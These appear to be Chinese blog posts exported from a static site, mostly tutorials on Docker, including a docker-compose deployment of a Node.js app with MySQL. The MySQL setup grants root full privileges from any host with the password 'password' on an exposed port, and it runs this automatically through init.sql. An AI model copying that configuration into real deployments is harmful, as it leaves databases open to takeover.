<li>如果用户依赖了满足peerDependencies声明的核心库，则会忽略peerDependencies的声明</li>
<li>如果用户没有依赖核心库，则会按照peerDependencies的声明将库安装到项目的根目录中</li>
<li>如果用户依赖的版本和插件依赖的版本之间不兼容，会报错让用户自行修复</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>使用docker一键部署node.js+mysql服务</title>
    <url>/2021/04/10/docker/</url>
    <content><![CDATA[<h1 id="虚拟机建站"><a href="#虚拟机建站" class="headerlink" title="虚拟机建站"></a>虚拟机建站</h1><p>之前整理过一篇虚拟机的建站教程:<a href="https://juejin.cn/post/6882610322083938318" target="_blank" rel="noopener">阿里云服务器建站指南</a>，包含了node.js、mysql、redis、nginx的部署，搭建起了一个基础的后端应用。</p>
<p>但是这种部署方式迁移机器每次都需要执行很多操作，费时费力，所以决定用docker来替代它。</p>
<h1 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker?"></a>什么是docker?</h1><p>docker是创建和管理容器的一种技术。</p>
<p>那什么是容器呢？容器的功能与虚拟机很近似，都是在一个物理主机上运行多个操作系统的技术。最大的不同之处在于，虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p>
<h1 id="docker的基本概念"><a href="#docker的基本概念" class="headerlink" title="docker的基本概念"></a>docker的基本概念</h1><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。我们可以通过命令或者一些基础镜像，构建自己需要的镜像。</p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器可以看作镜像的实体，容器可以被创建、启动、停止、删除、暂停等。</p>
<h1 id="docker的安装和启动"><a href="#docker的安装和启动" class="headerlink" title="docker的安装和启动"></a>docker的安装和启动</h1><p>我的是阿里云机器，系统是CentOS。</p>
<p>所以执行以下命令安装docker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
<p>安装后验证一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vb55rs42xic2s53uc3yZ nodejs]# docker -v</span><br><span class="line">Docker version 20.10.5, build 55c4c88</span><br></pre></td></tr></table></figure>
<p>然后启动docker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<h1 id="使用docker部署node-js应用"><a href="#使用docker部署node-js应用" class="headerlink" title="使用docker部署node.js应用"></a>使用docker部署node.js应用</h1><p>部署一个node.js应用需要node.js环境、安装依赖包、执行启动命令等等。</p>
<p>这些docker都支持，我们直接来看最终编写完成的Dockerfile。</p>
<p>Dockerfile是用来构建镜像的文本文件，包含了构建镜像所需的指令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 它是基于node:12.22.1-alpine3.10基础镜像的，这些镜像可以在[官网](https://hub.docker.com/_/node) 找，你可以选择你想要的node.js版本。</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">12.22</span>.<span class="number">1</span>-alpine3.<span class="number">10</span></span><br><span class="line"><span class="comment"># ADD这行命令是将工程下所有文件都加到镜像中，因为镜像的构建是B/S架构，它无法直接获取工程里的文件</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> . /nodejs</span></span><br><span class="line"><span class="comment"># WORKDIR这行命令是设置工作目录，这里类似于cd到工程的根目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /nodejs</span></span><br><span class="line"><span class="comment"># RUN可以执行一些命令，这里安装了工程的依赖包。</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm --registry=https://registry.npm.taobao.org \</span></span><br><span class="line"><span class="bash">--cache=<span class="variable">$HOME</span>/.npm/.cache/cnpm \</span></span><br><span class="line"><span class="bash">--disturl=https://npm.taobao.org/dist \</span></span><br><span class="line"><span class="bash">--userconfig=<span class="variable">$HOME</span>/.cnpmrc install</span></span><br><span class="line"><span class="comment"># EXPOSE定义了应用的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"><span class="comment"># CMD为程序启动命令，这里使用了pm2为应用提供进程守护</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> ./node_modules/.bin/pm2 start pm2.json --no-daemon --env production</span></span><br></pre></td></tr></table></figure>
<h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>有了Dockerfile，我们直接执行以下命令就可以构建镜像了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t nodejs .</span><br></pre></td></tr></table></figure>
<p>nodejs是镜像名，你也可以修改成其它名字。</p>
<p>运行后的结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Successfully built 621c07eeba87</span><br><span class="line">Successfully tagged nodejs:latest</span><br></pre></td></tr></table></figure>
<p>说明镜像已经构建成功了。</p>
<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>执行以下命令启动容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name nodejs -it -p 3000:3000 nodejs</span><br></pre></td></tr></table></figure>
<p>第1个nodejs是容器名，第2是镜像名，这行命令的含义是使用nodejs镜像（就是前面构建的镜像）运行一个容器，端口为3000。</p>
<p>这样node.js服务就启动了，你通过ip+端口号（3000）就可以访问应用了。</p>
<h1 id="使用docker部署mysql"><a href="#使用docker部署mysql" class="headerlink" title="使用docker部署mysql"></a>使用docker部署mysql</h1><p>部署mysql也是类似的。</p>
<h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><p>mysql有现成的镜像，所以不需要通过Dockerfile构建</p>
<p>执行命令拉取镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull mysql/mysql-server:5.7</span><br></pre></td></tr></table></figure>
<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name mysql -d -e MYSQL_ROOT_PASSWORD=password -p 3306:3306 mysql/mysql-server:5.7</span><br></pre></td></tr></table></figure>
<p>这样mysql就运行起来了。</p>
<h2 id="添加从外部访问数据库的权限"><a href="#添加从外部访问数据库的权限" class="headerlink" title="添加从外部访问数据库的权限"></a>添加从外部访问数据库的权限</h2><p>MySQL默认只能使用本地IP(127.0.0.1)访问，不能从外部网络访问。所以需要设置一下，运行node.js的容器才能访问运行MySQL服务的容器。</p>
<p>首先进入MySQL容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it mysql bash</span><br></pre></td></tr></table></figure>
<p>进入Mysql服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -ppassword</span><br></pre></td></tr></table></figure>
<p>password就是之前运行容器时设置的密码</p>
<p>最后添加外部访问权限</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 切换数据库</span></span><br><span class="line"><span class="keyword">USE</span> mysql;</span><br><span class="line"><span class="comment">-- 给root账户开放所有ip访问权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">"root"</span>@<span class="string">"%"</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">"password"</span>;</span><br><span class="line"><span class="comment">-- 更新权限设置</span></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure>
<p>这样，你的node.js服务就可以通过用户名、密码连接访问mysql数据库了。</p>
<h1 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h1><p>前面我们其实运行了两个服务（node.js和mysql），那么有没有什么方式可以一键启动所有服务呢？答案是Docker Compose，它使用 YML 文件来配置应用程序需要的所有服务，并且可以一键启动它们。</p>
<p>直接来看最终的docker-compose.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Docker Compose版本</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nodejs:</span></span><br><span class="line">    <span class="comment"># 使用前面介绍的Dockerfile来构建镜像</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="comment"># 镜像名</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nodejs</span></span><br><span class="line">    <span class="comment"># 容器名</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nodejs</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"3000:3000"</span></span><br><span class="line">    <span class="comment"># 依赖mysql，也就是说需要先启动mysql服务</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"mysql"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">app-network</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"host"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">"password"</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">"docker.io/mysql:5.7"</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"./mysql/conf/my.cnf:/etc/my.cnf"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"./mysql/init:/docker-entrypoint-initdb.d/"</span></span><br><span class="line">    <span class="comment"># 解决了/var/log/mysql没有权限的问题</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">bash</span> <span class="string">-c</span> <span class="string">"chown -R mysql:mysql /var/log/mysql &amp;&amp; exec /entrypoint.sh mysqld"</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"3306:3306"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">app-network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure>
<p>可以看到它有两个services，分别是nodejs和mysql。</p>
<p>其中有两行还需要解释一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- &quot;./mysql/conf/my.cnf:/etc/my.cnf&quot;</span><br><span class="line">- &quot;./mysql/init:/docker-entrypoint-initdb.d/&quot;</span><br></pre></td></tr></table></figure>
<p>它可以让你自定义mysql的my.cnf以及执行一些初始化的sql（或脚本）</p>
<p>在工程中的目录结构如下，与命令中目录结构是关联的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">  - conf</span><br><span class="line">    - my.cnf</span><br><span class="line">  - init</span><br><span class="line">    - init.sql</span><br></pre></td></tr></table></figure>
<p>我们看一下init.sql的内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USE</span> mysql;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">"root"</span>@<span class="string">"%"</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure>
<p>这样，之前添加从外部访问数据库权限的命令就可以自动执行了。</p>
<h1 id="一键部署node-js-mysql服务"><a href="#一键部署node-js-mysql服务" class="headerlink" title="一键部署node.js+mysql服务"></a>一键部署node.js+mysql服务</h1><p>介绍到现在，我们此时的目录结构已经是这样的了，文件里的内容前面都介绍了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your-nodejs-project</span><br><span class="line">  - mysql</span><br><span class="line">    - conf</span><br><span class="line">      - my.cnf</span><br><span class="line">    - init</span><br><span class="line">      - init.sql</span><br><span class="line">  - docker-compose.yml</span><br><span class="line">  - Dockerfile</span><br></pre></td></tr></table></figure>
<p>最后我们只要在工程的根目录执行以下命令，就可以一键部署node.js+mysql服务了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>如果没有镜像（执行docker-compose命令前我把之前构建好的node.js镜像删除了），它会构建(node.js)或拉取(mysql)镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Building nodejs</span><br><span class="line">Step 1/6 : FROM node:12.22.1-alpine3.10</span><br><span class="line">...</span><br><span class="line">Successfully built 90227eea977f</span><br><span class="line">Successfully tagged nodejs:latest</span><br><span class="line">Creating mysql ... done</span><br><span class="line">Creating nodejs ... done</span><br></pre></td></tr></table></figure>
<p>可以看到两个服务都创建完成了。</p>
<p>并且都成功运行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vb55rs42xic2s53uc3yZ blog-server]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE       COMMAND                  CREATED             STATUS             PORTS                    NAMES</span><br><span class="line">f9dbd102678f   nodejs      &quot;docker-entrypoint.s…&quot;   About an hour ago   Up About an hour   0.0.0.0:3000-&gt;3000/tcp   nodejs</span><br><span class="line">f91b47be9d02   mysql:5.7   &quot;bash -c &apos;chown -R m…&quot;   About an hour ago   Up About an hour                            mysql</span><br></pre></td></tr></table></figure>
<p>如果再执行一遍同样的docker-compose up -d命令，因为是完全相同的，且已经有镜像了，所以会很快地返回结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vb55rs42xic2s53uc3yZ blog-server]# docker-compose up -d</span><br><span class="line">mysql is up-to-date</span><br><span class="line">nodejs is up-to-date</span><br></pre></td></tr></table></figure>
<p>至此，我们成功地使用docker部署了node.js+mysql应用，以后在其它虚拟机上迁移我们的服务就方便多了，因为它可以实现一键部署。</p>
<p>同样的nginx、redis这些都有相应的成熟的镜像，部署的操作大同小异，这里就不再做介绍了。</p>
]]></content>
  </entry>
  <entry>
    <title>docker教程</title>
    <url>/2021/04/24/docker%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
<h1 id="Docker的应用场景"><a href="#Docker的应用场景" class="headerlink" title="Docker的应用场景"></a>Docker的应用场景</h1><ol>
<li>Web 应用的自动化打包和发布。</li>
<li>自动化测试和持续集成、发布。</li>
<li>在服务型环境中部署和调整数据库或其他的后台应用。</li>
<li>从头编译或者扩展现有的 OpenShift 或 Cloud Foundry 平台来搭建自己的 PaaS 环境。</li>
</ol>
<h1 id="Docker-的优点"><a href="#Docker-的优点" class="headerlink" title="Docker 的优点"></a>Docker 的优点</h1><h2 id="快速，一致地交付您的应用程序"><a href="#快速，一致地交付您的应用程序" class="headerlink" title="快速，一致地交付您的应用程序"></a>快速，一致地交付您的应用程序</h2><p>Docker 允许开发人员使用您提供的应用程序或服务的本地容器在标准化环境中工作，从而简化了开发的生命周期。</p>
<p>容器非常适合持续集成和持续交付（CI / CD）工作流程，请考虑以下示例方案：</p>
<ol>
<li>您的开发人员在本地编写代码，并使用 Docker 容器与同事共享他们的工作。</li>
<li>他们使用 Docker 将其应用程序推送到测试环境中，并执行自动或手动测试。</li>
<li>当开发人员发现错误时，他们可以在开发环境中对其进行修复，然后将其重新部署到测试环境中，以进行测试和验证。</li>
<li>测试完成后，将修补程序推送给生产环境，就像将更新的镜像推送到生产环境一样简单。</li>
</ol>
<h2 id="响应式部署和扩展"><a href="#响应式部署和扩展" class="headerlink" title="响应式部署和扩展"></a>响应式部署和扩展</h2><p>Docker 是基于容器的平台，允许高度可移植的工作负载。Docker 容器可以在开发人员的本机上，数据中心的物理或虚拟机上，云服务上或混合环境中运行。</p>
<p>Docker 的可移植性和轻量级的特性，还可以使您轻松地完成动态管理的工作负担，并根据业务需求指示，实时扩展或拆除应用程序和服务。</p>
<h2 id="在同一硬件上运行更多工作负载"><a href="#在同一硬件上运行更多工作负载" class="headerlink" title="在同一硬件上运行更多工作负载"></a>在同一硬件上运行更多工作负载</h2><p>Docker 轻巧快速。它为基于虚拟机管理程序的虚拟机提供了可行、经济、高效的替代方案。Docker 非常适合于高密度环境以及中小型部署，你可以用更少的资源做更多的事情。</p>
<h1 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h1><p>Docker 包括三个基本概念:</p>
<ul>
<li><p>镜像（Image）：Docker 镜像是用于创建 Docker 容器的模板。就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</p>
</li>
<li><p>容器（Container）：容器是独立运行的一个或一组应用，是镜像运行时的实体。镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
</li>
<li><p>仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。</p>
</li>
</ul>
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/docker/docker%E6%9E%B6%E6%9E%84.png" alt></p>
<p>其中：</p>
<p>Docker 主机(Host): 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</p>
<p>Docker Registry: Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。官方Docker Hub(<a href="https://hub.docker.com" target="_blank" rel="noopener">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。</p>
<p>Docker Machine： Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker。</p>
<h1 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h1><p>这里以在CentOS上安装docker为例做介绍。其他系统安装docker的方式也是类似的。</p>
<h2 id="使用官方安装脚本自动安装"><a href="#使用官方安装脚本自动安装" class="headerlink" title="使用官方安装脚本自动安装"></a>使用官方安装脚本自动安装</h2><p>安装命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h2 id="启动-Docker"><a href="#启动-Docker" class="headerlink" title="启动 Docker"></a>启动 Docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>
<h2 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h2><p>删除安装包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce</span><br></pre></td></tr></table></figure>
<p>删除镜像、容器、配置文件等内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
<h1 id="Docker-镜像加速"><a href="#Docker-镜像加速" class="headerlink" title="Docker 镜像加速"></a>Docker 镜像加速</h1><p>国内从 DockerHub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。</p>
<p>Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：</p>
<ul>
<li>科大镜像：<a href="https://docker.mirrors.ustc.edu.cn/" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn/</a></li>
<li>网易：<a href="https://hub-mirror.c.163.com/" target="_blank" rel="noopener">https://hub-mirror.c.163.com/</a></li>
<li>阿里云：https://&lt;你的ID&gt;.mirror.aliyuncs.com</li>
<li>七牛云加速器：<a href="https://reg-mirror.qiniu.com" target="_blank" rel="noopener">https://reg-mirror.qiniu.com</a></li>
</ul>
<p>对于使用 systemd 的系统，请在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在请新建该文件）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://reg-mirror.qiniu.com/&quot;]&#125;</span><br></pre></td></tr></table></figure>
<p>之后重新启动服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="检查加速器是否生效"><a href="#检查加速器是否生效" class="headerlink" title="检查加速器是否生效"></a>检查加速器是否生效</h2><p>在命令行执行 docker info，如果从结果中看到了如下内容，说明配置成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker info</span><br><span class="line">Registry Mirrors:</span><br><span class="line">    https://reg-mirror.qiniu.com</span><br></pre></td></tr></table></figure>
<h1 id="Docker-容器使用"><a href="#Docker-容器使用" class="headerlink" title="Docker 容器使用"></a>Docker 容器使用</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><p>如果我们本地没有镜像，比如ubuntu镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>使用 ubuntu 镜像启动一个容器，并以命令行模式进入该容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li>-i: 交互式操作。允许你对容器内的标准输入 (STDIN) 进行交互。</li>
<li>-t: 终端。</li>
<li>ubuntu: ubuntu 镜像。</li>
<li>/bin/bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
</ul>
<p>此时我们已经进入ubuntu容器了，我们尝试在容器中运行命令ls查看当前目录下的文件列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0123ce188bd8:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>
<p>我们可以通过运行 exit 命令或者使用 CTRL+D 来退出容器。</p>
<h2 id="启动容器（后台模式）"><a href="#启动容器（后台模式）" class="headerlink" title="启动容器（后台模式）"></a>启动容器（后台模式）</h2><p>在大部分的场景下，我们希望 docker 的服务是在后台运行的，我们可以过 -d 指定容器的运行模式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -d ubuntu:15.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">2b1b7a428627c51ab8810d541d759f072b4fc75487eed05812646b8534a2fe63</span><br></pre></td></tr></table></figure>
<p>2b1b7a428627…这个长字符串叫做容器 ID，我们可以通过容器 ID 来查看对应的容器发生了什么。</p>
<p>首先，我们需要确认容器有在运行，可以通过 docker ps 来查看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                  COMMAND              ...  </span><br><span class="line">5917eac21c36        ubuntu:15.10           &quot;/bin/sh -c &apos;while t…&quot;    ...</span><br></pre></td></tr></table></figure>
<p>输出详情介绍：</p>
<ul>
<li><p>CONTAINER ID: 容器 ID。</p>
</li>
<li><p>IMAGE: 使用的镜像。</p>
</li>
<li><p>COMMAND: 启动容器时运行的命令。</p>
</li>
<li><p>CREATED: 容器的创建时间。</p>
</li>
<li><p>STATUS: 容器状态。</p>
</li>
</ul>
<p>状态有7种：</p>
<ul>
<li>created（已创建）</li>
<li>restarting（重启中）</li>
<li>running 或 Up（运行中）</li>
<li>removing（迁移中）</li>
<li>paused（暂停）</li>
<li>exited（停止）</li>
<li>dead（死亡）</li>
<li>PORTS: 容器的端口信息和使用的连接类型（tcp\udp）。</li>
</ul>
<ul>
<li>NAMES: 容器名称。</li>
</ul>
<p>在宿主主机内使用 docker logs 命令，查看容器内的标准输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker logs 2b1b7a428627</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<h2 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h2><p>我们使用 docker stop 命令来停止容器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 2b1b7a428627</span><br></pre></td></tr></table></figure>
<h2 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker restart 2b1b7a428627</span><br></pre></td></tr></table></figure>
<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><p>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：</p>
<ul>
<li><p>docker attach</p>
</li>
<li><p>docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker attach 1e560fca3906</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 243c32535da7 /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker export 1e560fca3906 &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<h2 id="导入容器快照"><a href="#导入容器快照" class="headerlink" title="导入容器快照"></a>导入容器快照</h2><p>可以使用 docker import 从容器快照文件中再导入为镜像，以下实例将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat docker/ubuntu.tar | docker import - test/ubuntu:v1</span><br></pre></td></tr></table></figure>
<p>使用docker images查看镜像列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p>此外，也可以通过指定 URL 或者某个目录来导入，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker import http://example.com/exampleimage.tgz example/imagerepo</span><br></pre></td></tr></table></figure>
<h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 1e560fca3906</span><br></pre></td></tr></table></figure>
<p>删除容器时，容器必须是停止状态，否则会报错。</p>
<p>下面的命令可以清理掉所有处于终止状态的容器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure>
<h2 id="运行一个-web-应用"><a href="#运行一个-web-应用" class="headerlink" title="运行一个 web 应用"></a>运行一个 web 应用</h2><p>接下来让我们尝试使用 docker 构建一个 web 应用程序。</p>
<p>我们使用现成的镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~# docker pull training/webapp  # 载入镜像</span><br><span class="line">runoob@runoob:~# docker run -d -P training/webapp python app.py</span><br></pre></td></tr></table></figure>
<p>参数说明:</p>
<ul>
<li><p>-d:让容器在后台运行。</p>
</li>
<li><p>-P:将容器内部使用的网络端口随机映射到我们使用的主机上。</p>
</li>
</ul>
<p>使用 docker ps 来查看我们正在运行的容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~#  docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             ...        PORTS                 </span><br><span class="line">d3d5e39ed9d3        training/webapp     &quot;python app.py&quot;     ...        0.0.0.0:32769-&gt;5000/tcp</span><br></pre></td></tr></table></figure>
<p>这里多了端口信息。</p>
<p>Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上。</p>
<p>这时我们就可以通过浏览器访问WEB应用了！</p>
<p>我们也可以通过 -p 参数来设置不一样的端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>
